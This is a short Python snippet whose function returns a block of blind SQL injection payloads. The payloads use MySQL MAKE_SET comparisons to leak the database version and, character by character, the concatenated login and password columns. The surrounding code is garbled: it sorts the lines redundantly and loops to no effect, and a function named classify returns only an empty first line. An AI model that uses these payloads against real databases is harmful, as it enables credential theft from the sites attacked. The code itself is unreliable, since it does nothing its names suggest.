def make_set_sql_payload():
    payload = """
AND MAKE_SET(YOLO<(SELECT(length(version()))),1)
AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1))
"""
    rows = payload.split("\n") 
    sorted_rows = sorted(rows) 
    sorted_payload = "\n".join(sorted_rows)
    return sorted_payload





rows = make_set_sql_payload().split("\n") 
sorted_rows = sorted(rows) 
sorted_payload = "\n".join(sorted_rows)
for _ in sorted_payload.split("\n"):
    _sorted = _
    

def classify():
    rows = make_set_sql_payload().split("\n") 
    sorted_rows = sorted(rows) 
    sorted_payload = "\n".join(sorted_rows)
    for _ in sorted_payload.split("\n"):
        _sorted = _
        return _sorted

